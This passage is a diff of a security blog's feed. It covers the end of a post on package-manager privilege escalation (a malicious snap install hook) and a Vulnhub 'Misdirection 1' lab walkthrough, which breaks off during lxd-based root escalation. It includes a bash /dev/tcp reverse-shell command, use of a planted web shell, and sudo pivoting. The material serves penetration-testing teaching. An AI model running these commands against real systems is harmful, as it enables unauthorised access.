+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>chmod +x hooks/install
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Now let&amp;rsquo;s edit the snapcraft.yaml file, we&amp;rsquo;ll change the default name, summary and description and also delete the base entry.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-yaml" data-lang="yaml">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">name&lt;/span>: &lt;span style="color:#ae81ff">exploit&lt;/span> &lt;span style="color:#75715e"># you probably want to &amp;#39;snapcraft register &amp;lt;name&amp;gt;&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">version&lt;/span>: &lt;span style="color:#e6db74">&amp;#39;0.1&amp;#39;&lt;/span> &lt;span style="color:#75715e"># just for humans, typically &amp;#39;1.2+git&amp;#39; or &amp;#39;1.3.2&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">summary&lt;/span>: &lt;span style="color:#ae81ff">privesc exploit&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">description&lt;/span>: |&lt;span style="color:#e6db74">
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> privesc exploit
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> grade: devel # must be &amp;#39;stable&amp;#39; to release into candidate/stable channels
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> confinement: devmode # use &amp;#39;strict&amp;#39; once you have the right plugs and slots
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> parts:
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> my-part:
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> # See &amp;#39;snapcraft plugins&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">plugin&lt;/span>: &lt;span style="color:#ae81ff">nil&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Let&amp;rsquo;s move back into the &lt;code>exploit&lt;/code> directory and then run &lt;code>snapcraft&lt;/code> command to create the package then install it.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>sudo snap install --dangerous --devmode exploit_0.1_amd64.snap
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Once installed we see our user has been added and we can switch user and get the root shell.&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/package_manager_privesc/privesc-13.png" class="center" style="border-radius: 8px;" />
 &lt;h4 id="2-fpm">2. fpm&lt;/h4>
 &lt;p>Using fpm we&amp;rsquo;ll use the exact same file structure but change the &lt;code>snap&lt;/code> directory name to &lt;code>meta&lt;/code>.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">fpm -n exploit -s dir -t snap -a all meta
-&lt;/code>&lt;/pre>&lt;/div>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>fpm -n exploit -s dir -t snap -a all meta
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
 &lt;img src="https://blog.ikuamike.io/img/package_manager_privesc/privesc-14.png" class="center" style="border-radius: 8px;" />
 &lt;p>When we install it we see that our new user has been added and we can obtain a root shell by switching to that user,
 same way as earlier.&lt;/p>
@@ -259,19 +260,30 @@ task. Therefore, only provide this permission with these risks in mind.&lt;/p>
 It can be installed on any of the distros but I encountered issues installing it on centos, therefore I skipped it.&lt;/p>
 &lt;p>There are some techniques I haven&amp;rsquo;t fully explored like using &lt;strong>rpm&lt;/strong>, feel free to try this out on the provided cyberranges lab.&lt;/p>
 &lt;h2 id="references">References&lt;/h2>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">https://github.com/jordansissel/fpm/
-http://manpages.ubuntu.com/manpages/focal/en/man8/apt.8.html
-http://manpages.ubuntu.com/manpages/focal/man5/apt.conf.5.html
-https://gtfobins.github.io/gtfobins/apt/
-https://gtfobins.github.io/gtfobins/yum/
-https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/deployment_guide/sec-yum_plugins
-http://yum.baseurl.org/wiki/WritingYumPlugins.html
-https://www.tecmint.com/enable-disable-and-install-yum-plug-ins/
-https://gtfobins.github.io/gtfobins/snap/
-https://snapcraft.io/docs/supported-snap-hooks
-https://0xdf.gitlab.io/2021/07/24/htb-armageddon.html
-https://youtu.be/8ikdbyOQsLg
-&lt;/code>&lt;/pre>&lt;/div></content></item><item><title>Vulnub: Misdirection 1</title><link>https://blog.ikuamike.io/posts/2021/misdirection1/</link><pubDate>Wed, 21 Apr 2021 00:00:00 +0000</pubDate><guid>https://blog.ikuamike.io/posts/2021/misdirection1/</guid><description/><content>&lt;img src="https://blog.ikuamike.io/img/misdirection1/misdirection.png" class="center" style="border-radius: 8px;" />
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>https://github.com/jordansissel/fpm/
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>http://manpages.ubuntu.com/manpages/focal/en/man8/apt.8.html
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>http://manpages.ubuntu.com/manpages/focal/man5/apt.conf.5.html
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>https://gtfobins.github.io/gtfobins/apt/
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>https://gtfobins.github.io/gtfobins/yum/
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/deployment_guide/sec-yum_plugins
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>http://yum.baseurl.org/wiki/WritingYumPlugins.html
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>https://www.tecmint.com/enable-disable-and-install-yum-plug-ins/
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>https://gtfobins.github.io/gtfobins/snap/
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>https://snapcraft.io/docs/supported-snap-hooks
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>https://0xdf.gitlab.io/2021/07/24/htb-armageddon.html
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>https://youtu.be/8ikdbyOQsLg
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></content></item><item><title>Vulnub: Misdirection 1</title><link>https://blog.ikuamike.io/posts/2021/misdirection1/</link><pubDate>Wed, 21 Apr 2021 00:00:00 +0000</pubDate><guid>https://blog.ikuamike.io/posts/2021/misdirection1/</guid><description/><content>&lt;img src="https://blog.ikuamike.io/img/misdirection1/misdirection.png" class="center" style="border-radius: 8px;" />
 &lt;table>
 &lt;thead>
 &lt;tr>
@@ -294,99 +306,103 @@ and were able to pivot to that account. Once we are brexit user, we abuse his me
 privileged container that can read and write the whole file system by mounting it in the container.&lt;/p>
 &lt;h2 id="reconnaissance">Reconnaissance&lt;/h2>
 &lt;p>Nmap&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">Nmap scan report &lt;span style="color:#66d9ef">for&lt;/span> 192.168.191.136
-Host is up &lt;span style="color:#f92672">(&lt;/span>0.00032s latency&lt;span style="color:#f92672">)&lt;/span>.
-Not shown: &lt;span style="color:#ae81ff">65531&lt;/span> closed ports
-PORT STATE SERVICE VERSION
-22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 &lt;span style="color:#f92672">(&lt;/span>Ubuntu Linux; protocol 2.0&lt;span style="color:#f92672">)&lt;/span>
-80/tcp open http Rocket httpd 1.2.6 &lt;span style="color:#f92672">(&lt;/span>Python 2.7.15rc1&lt;span style="color:#f92672">)&lt;/span>
-3306/tcp open mysql MySQL &lt;span style="color:#f92672">(&lt;/span>unauthorized&lt;span style="color:#f92672">)&lt;/span>
-8080/tcp open http Apache httpd 2.4.29 &lt;span style="color:#f92672">((&lt;/span>Ubuntu&lt;span style="color:#f92672">))&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="enumeration">Enumeration&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>Nmap scan report &lt;span style="color:#66d9ef">for&lt;/span> 192.168.191.136
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host is up &lt;span style="color:#f92672">(&lt;/span>0.00032s latency&lt;span style="color:#f92672">)&lt;/span>.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Not shown: &lt;span style="color:#ae81ff">65531&lt;/span> closed ports
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PORT STATE SERVICE VERSION
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 &lt;span style="color:#f92672">(&lt;/span>Ubuntu Linux; protocol 2.0&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>80/tcp open http Rocket httpd 1.2.6 &lt;span style="color:#f92672">(&lt;/span>Python 2.7.15rc1&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>3306/tcp open mysql MySQL &lt;span style="color:#f92672">(&lt;/span>unauthorized&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>8080/tcp open http Apache httpd 2.4.29 &lt;span style="color:#f92672">((&lt;/span>Ubuntu&lt;span style="color:#f92672">))&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="enumeration">Enumeration&lt;/h2>
 &lt;h3 id="8080-http">8080 (HTTP)&lt;/h3>
 &lt;p>Nmap&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">&lt;span style="color:#75715e"># Nmap 7.91 scan initiated Wed Apr 14 06:31:44 2021 as: nmap -n -Pn -sV -p 8080 --script default,http-enum,http-shellshock,http-backup-finder,http-config-backup --append-output -oN recon-misdirection1/misdirection1-8080-httpnmap.enum 192.168.191.136&lt;/span>
-Nmap scan report &lt;span style="color:#66d9ef">for&lt;/span> 192.168.191.136
-Host is up &lt;span style="color:#f92672">(&lt;/span>0.00026s latency&lt;span style="color:#f92672">)&lt;/span>.
-PORT STATE SERVICE VERSION
-8080/tcp open http Apache httpd 2.4.29 &lt;span style="color:#f92672">((&lt;/span>Ubuntu&lt;span style="color:#f92672">))&lt;/span>
-| http-enum:
-| /wordpress/: Blog
-| /wordpress/wp-login.php: Wordpress login page.
-| /css/: Potentially interesting directory w/ listing on &lt;span style="color:#e6db74">&amp;#39;apache/2.4.29 (ubuntu)&amp;#39;&lt;/span>
-| /debug/: Potentially interesting folder
-| /development/: Potentially interesting directory w/ listing on &lt;span style="color:#e6db74">&amp;#39;apache/2.4.29 (ubuntu)&amp;#39;&lt;/span>
-| /help/: Potentially interesting directory w/ listing on &lt;span style="color:#e6db74">&amp;#39;apache/2.4.29 (ubuntu)&amp;#39;&lt;/span>
-| /images/: Potentially interesting directory w/ listing on &lt;span style="color:#e6db74">&amp;#39;apache/2.4.29 (ubuntu)&amp;#39;&lt;/span>
-| /js/: Potentially interesting directory w/ listing on &lt;span style="color:#e6db74">&amp;#39;apache/2.4.29 (ubuntu)&amp;#39;&lt;/span>
-| /manual/: Potentially interesting directory w/ listing on &lt;span style="color:#e6db74">&amp;#39;apache/2.4.29 (ubuntu)&amp;#39;&lt;/span>
-|_ /scripts/: Potentially interesting directory w/ listing on &lt;span style="color:#e6db74">&amp;#39;apache/2.4.29 (ubuntu)&amp;#39;&lt;/span>
-|_http-server-header: Apache/2.4.29 &lt;span style="color:#f92672">(&lt;/span>Ubuntu&lt;span style="color:#f92672">)&lt;/span>
-|_http-title: Apache2 Ubuntu Default Page: It works
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>ffuf&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">ffuf -ic -c -u http://192.168.191.136:8080/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -t &lt;span style="color:#ae81ff">50&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">js &lt;span style="color:#f92672">[&lt;/span>Status: 301, Size: 322, Words: 20, Lines: 10&lt;span style="color:#f92672">]&lt;/span>
-help &lt;span style="color:#f92672">[&lt;/span>Status: 301, Size: 324, Words: 20, Lines: 10&lt;span style="color:#f92672">]&lt;/span>
-wordpress &lt;span style="color:#f92672">[&lt;/span>Status: 301, Size: 329, Words: 20, Lines: 10&lt;span style="color:#f92672">]&lt;/span>
-manual &lt;span style="color:#f92672">[&lt;/span>Status: 301, Size: 326, Words: 20, Lines: 10&lt;span style="color:#f92672">]&lt;/span>
-debug &lt;span style="color:#f92672">[&lt;/span>Status: 301, Size: 325, Words: 20, Lines: 10&lt;span style="color:#f92672">]&lt;/span>
-development &lt;span style="color:#f92672">[&lt;/span>Status: 301, Size: 331, Words: 20, Lines: 10&lt;span style="color:#f92672">]&lt;/span>
-shell &lt;span style="color:#f92672">[&lt;/span>Status: 301, Size: 325, Words: 20, Lines: 10&lt;span style="color:#f92672">]&lt;/span>
-images &lt;span style="color:#f92672">[&lt;/span>Status: 301, Size: 326, Words: 20, Lines: 10&lt;span style="color:#f92672">]&lt;/span>
-css &lt;span style="color:#f92672">[&lt;/span>Status: 301, Size: 323, Words: 20, Lines: 10&lt;span style="color:#f92672">]&lt;/span>
-scripts &lt;span style="color:#f92672">[&lt;/span>Status: 301, Size: 327, Words: 20, Lines: 10&lt;span style="color:#f92672">]&lt;/span>
-server-status &lt;span style="color:#f92672">[&lt;/span>Status: 403, Size: 305, Words: 22, Lines: 12&lt;span style="color:#f92672">]&lt;/span>
-&lt;span style="color:#f92672">[&lt;/span>Status: 200, Size: 10918, Words: 3499, Lines: 376&lt;span style="color:#f92672">]&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>After some directory bruteforcing on both port 80 and 8080 I discovered several directories. On port 8080 the debug directory
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Nmap 7.91 scan initiated Wed Apr 14 06:31:44 2021 as: nmap -n -Pn -sV -p 8080 --script default,http-enum,http-shellshock,http-backup-finder,http-config-backup --append-output -oN recon-misdirection1/misdirection1-8080-httpnmap.enum 192.168.191.136&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Nmap scan report &lt;span style="color:#66d9ef">for&lt;/span> 192.168.191.136
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host is up &lt;span style="color:#f92672">(&lt;/span>0.00026s latency&lt;span style="color:#f92672">)&lt;/span>.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PORT STATE SERVICE VERSION
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>8080/tcp open http Apache httpd 2.4.29 &lt;span style="color:#f92672">((&lt;/span>Ubuntu&lt;span style="color:#f92672">))&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| http-enum:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| /wordpress/: Blog
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| /wordpress/wp-login.php: Wordpress login page.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| /css/: Potentially interesting directory w/ listing on &lt;span style="color:#e6db74">&amp;#39;apache/2.4.29 (ubuntu)&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| /debug/: Potentially interesting folder
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| /development/: Potentially interesting directory w/ listing on &lt;span style="color:#e6db74">&amp;#39;apache/2.4.29 (ubuntu)&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| /help/: Potentially interesting directory w/ listing on &lt;span style="color:#e6db74">&amp;#39;apache/2.4.29 (ubuntu)&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| /images/: Potentially interesting directory w/ listing on &lt;span style="color:#e6db74">&amp;#39;apache/2.4.29 (ubuntu)&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| /js/: Potentially interesting directory w/ listing on &lt;span style="color:#e6db74">&amp;#39;apache/2.4.29 (ubuntu)&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| /manual/: Potentially interesting directory w/ listing on &lt;span style="color:#e6db74">&amp;#39;apache/2.4.29 (ubuntu)&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ /scripts/: Potentially interesting directory w/ listing on &lt;span style="color:#e6db74">&amp;#39;apache/2.4.29 (ubuntu)&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-server-header: Apache/2.4.29 &lt;span style="color:#f92672">(&lt;/span>Ubuntu&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-title: Apache2 Ubuntu Default Page: It works
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ffuf&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>ffuf -ic -c -u http://192.168.191.136:8080/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -t &lt;span style="color:#ae81ff">50&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>js &lt;span style="color:#f92672">[&lt;/span>Status: 301, Size: 322, Words: 20, Lines: 10&lt;span style="color:#f92672">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>help &lt;span style="color:#f92672">[&lt;/span>Status: 301, Size: 324, Words: 20, Lines: 10&lt;span style="color:#f92672">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>wordpress &lt;span style="color:#f92672">[&lt;/span>Status: 301, Size: 329, Words: 20, Lines: 10&lt;span style="color:#f92672">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>manual &lt;span style="color:#f92672">[&lt;/span>Status: 301, Size: 326, Words: 20, Lines: 10&lt;span style="color:#f92672">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>debug &lt;span style="color:#f92672">[&lt;/span>Status: 301, Size: 325, Words: 20, Lines: 10&lt;span style="color:#f92672">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>development &lt;span style="color:#f92672">[&lt;/span>Status: 301, Size: 331, Words: 20, Lines: 10&lt;span style="color:#f92672">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>shell &lt;span style="color:#f92672">[&lt;/span>Status: 301, Size: 325, Words: 20, Lines: 10&lt;span style="color:#f92672">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>images &lt;span style="color:#f92672">[&lt;/span>Status: 301, Size: 326, Words: 20, Lines: 10&lt;span style="color:#f92672">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>css &lt;span style="color:#f92672">[&lt;/span>Status: 301, Size: 323, Words: 20, Lines: 10&lt;span style="color:#f92672">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>scripts &lt;span style="color:#f92672">[&lt;/span>Status: 301, Size: 327, Words: 20, Lines: 10&lt;span style="color:#f92672">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>server-status &lt;span style="color:#f92672">[&lt;/span>Status: 403, Size: 305, Words: 22, Lines: 12&lt;span style="color:#f92672">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">[&lt;/span>Status: 200, Size: 10918, Words: 3499, Lines: 376&lt;span style="color:#f92672">]&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>After some directory bruteforcing on both port 80 and 8080 I discovered several directories. On port 8080 the debug directory
 contains a web shell.&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/misdirection1/misdirection-1.png" class="center" style="border-radius: 8px;" />
 &lt;h2 id="shell-as-www-data">Shell as www-data&lt;/h2>
 &lt;p>Supplying the following command we are able to get a reverse shell.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">bash -c &lt;span style="color:#e6db74">&amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.191.1/9000 0&amp;gt;&amp;amp;1 &amp;amp;&amp;#39;&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>shell:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>bash -c &lt;span style="color:#e6db74">&amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.191.1/9000 0&amp;gt;&amp;amp;1 &amp;amp;&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>shell:&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/misdirection1/misdirection-2.png" class="center" style="border-radius: 8px;" />
 &lt;p>After some basic enumeration we discover www-data has sudo permissions to run /bin/bash as brexit user without
 any password requirement.&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/misdirection1/misdirection-3.png" class="center" style="border-radius: 8px;" />
 &lt;h2 id="shell-as-brexit">Shell as brexit&lt;/h2>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">sudo -u brexit /bin/bash
-&lt;/code>&lt;/pre>&lt;/div>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>sudo -u brexit /bin/bash
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
 &lt;img src="https://blog.ikuamike.io/img/misdirection1/misdirection-4.png" class="center" style="border-radius: 8px;" />
 &lt;p>On running id we see that brexit is in the lxd group and no images are present.&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/misdirection1/misdirection-10.png" class="center" style="border-radius: 8px;" />
 &lt;h2 id="shell-as-root">Shell as root&lt;/h2>
 &lt;p>Brexit being in the lxd group allows for privilege escalation. First we need to add am image then create a container.&lt;/p>
 &lt;p>First we need to get distrobuilder, the compile it. This uses go to compile therefore you need go to be installed.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">wget https://github.com/lxc/distrobuilder/archive/refs/tags/distrobuilder-1.2.zip
-7z x distrobuilder-1.2.zip
-cd distrobuilder-distrobuilder-1.2
-make
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>You can use go get as the repo instructions recommend but for me it didn&amp;rsquo;t work as expected.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>wget https://github.com/lxc/distrobuilder/archive/refs/tags/distrobuilder-1.2.zip
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>7z x distrobuilder-1.2.zip
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>cd distrobuilder-distrobuilder-1.2
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>make
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>You can use go get as the repo instructions recommend but for me it didn&amp;rsquo;t work as expected.&lt;/p>
 &lt;p>With distrobuilder ready, download the alpine image yaml file to build a small alpine image for lxd&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>Then run distrobuilder with the alpine yaml file as below.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">sudo ~/bin/distrobuilder build-lxd alpine.yaml -o image.release&lt;span style="color:#f92672">=&lt;/span>3.8
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>This will result in two files: lxd.tar.xz and rootfs.squashfs.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Then run distrobuilder with the alpine yaml file as below.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>sudo ~/bin/distrobuilder build-lxd alpine.yaml -o image.release&lt;span style="color:#f92672">=&lt;/span>3.8
